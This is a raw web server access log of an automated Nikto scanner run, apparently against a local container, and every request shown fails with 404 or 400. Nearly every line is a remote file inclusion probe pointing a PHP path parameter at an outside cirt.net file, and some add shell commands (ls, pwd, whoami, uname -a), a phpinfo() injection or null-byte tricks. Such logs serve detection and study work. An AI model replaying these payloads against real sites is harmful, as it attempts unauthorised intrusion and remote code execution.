172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /suite/index.php?pg=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005889)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/admin_auth_cookies.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005890)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/admin_mods.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005891)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/admin_news.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005892)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/admin_settings.php?supa[include_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005893)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/admin_topics.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005894)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/admin_users.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005895)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/admin_utilities.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005896)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/backend_site.php?supa[include_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005897)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/common_functions.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005898)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/site_comment.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005899)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /supasite/site_news.php?supa[db_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005900)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /support/include/open_form.php?include_dir=http://cirt.net/rfiinc.txt??cmd=pwd HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005901)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /support/index.php?main=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005902)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /surveys/survey.inc.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005903)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sw/lib_comment/comment.php?doc_directory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005904)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sw/lib_find/find.php?doc_directory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005905)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sw/lib_session/session.php?doc_directory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005906)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sw/lib_up_file/file.php?doc_directory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005907)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sw/lib_up_file/find_file.php?doc_directory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005908)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sw/lib_user/find_user.php?doc_directory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005909)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sw/lib_user/user.php?doc_directory=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005910)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sys/code/box.inc.php?config[\\\"sipssys\\\"]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005911)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/ImageImageMagick.php?glConf[path_system]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005912)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/ImageImageMagick.php?glConf[path_system]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005913)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/_b/contentFiles/gBIndex.php?gBRootPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005914)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/admin/include/item_main.php?GLOBALS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005915)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/admin/include/upload_form.php?GLOBALS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005916)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/command/admin.cmd.php?GLOBALS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005917)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/command/download.cmd.php?GLOBALS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005918)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/funcs/xkurl.php?PEARPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005919)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/includes/pageheaderdefault.inc.php?_sysSessionPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005920)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system/login.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005921)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /tagit2b/tagmin/delTagUser.php?configpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005922)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /tags.php?BBCodeFile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005923)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /taxonservice.php?dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005924)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /teatro/pub/pub08_comments.php?basePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005925)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /technote7/skin_shop/standard/3_plugin_twindow/twindow_notice.php?shop_this_skin_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005926)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template.php?actionsPage=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005927)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template.php?blog_theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005928)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template.php?pagina=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005929)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/Noir/index.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005930)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/Vert/index.php?pageAll=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005931)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/Vert/index.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005932)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/barnraiser_01/p_new_password.tpl.php?templatePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005933)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/default/footer.php?ROOT_PATH=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005934)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/default/test/header.php?ROOT_PATH=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005935)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/gwb/user_bottom.php?config[template_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005936)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/purpletech/base_include.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005937)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/rwb/user_bottom.php?config[template_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005938)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template/rwb/user_bottom.php?config[template_path]=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005939)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /template_csv.php?rInfo[content]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005940)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/2blue/bodyTemplate.php?serverPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005941)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/2blue/bodyTemplate.php?serverPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005942)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/Official/part_userprofile.php?template_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005943)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/barrel/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005944)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/barrel/template.tpl.php?renderer=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005945)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/barry/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005946)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/be2004-2/index.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005947)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/datumVonDatumBis.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005948)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/default/header.inc.php?menu=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005949)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/default/index_logged.php?main_loaded=1&cur_module=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005950)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/default/tpl_message.php?right_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005951)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/footer.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005952)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/header.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005953)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/mylook/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005954)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/oerdec/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005955)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/pb/language/lang_nl.php?temppath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005956)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/penguin/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005957)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/sidebar/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005958)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/slashdot/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005959)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/stylesheets.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005960)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/text-only/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005961)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /templates/tmpl_dfl/scripts/index.php?dir[inc]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005962)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/breadcrumb.php?rootBase=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005963)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/default.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005964)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/format.php?_page_content=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005965)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/format.php?_page_css=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005966)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/frames1.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005967)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/frames1_center.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005968)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/frames1_left.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005969)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/frames1_top.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005970)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/phpAutoVideo/LightTwoOh/sidebar.php?loadpage=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005971)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/settings.php?pfad_z=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005972)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/test1.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005973)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/test2.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005974)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/test3.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005975)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/test4.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005976)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/test5.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005977)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /theme/test6.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005978)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes.php?GLOBALS[theme_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005979)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes/blackorange.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005980)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes/container.php?theme_directory=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005981)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes/default/layouts/standard.php?page_include=http://cirt.net/rfiinc.txt??&act=cmd&cmd=whoami&d=/&submit=1&cmd_txt=1 HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005982)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes/default/preview_post_completo.php?dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005983)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes/header.php?theme_directory=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005984)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes/ubb/login.php?theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005985)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /themes/ubb/login.php?theme=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005986)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /thumbnail.php?module=gallery&GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005987)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005988)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /timedifference.php?la=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005989)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /toolbar.loudmouth.php?mainframe=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005990)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /tools/update_translations.php?_SESSION[path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005991)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /top.php?laypath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005992)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /toplist.php?f=toplist_top10&phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005993)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /topsites/index.php?page=http://cirt.net/rfiinc.txt??&cmd=uNikto -a" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /topsites/index.php?page=http://cirt.net/rfiinc.txt??&cmd=uname -a" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /towels-0.1/src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005995)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /track.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005996)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /tsep/include/colorswitch.php?tsep_config[absPath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005997)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /tsep/include/colorswitch.php?tsep_config[absPath]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005998)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ttCMS_path/lib/db/ez_sql.php?lib_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005999)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /twebs/modules/misc/usermods.php?ROOT=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006000)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ubbt.inc.php?GLOBALS[thispath]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006001)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /unavailable.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006002)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /unsubs.php?scdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006003)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /up.php?my[root]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006004)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /upload.php?save_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006005)"
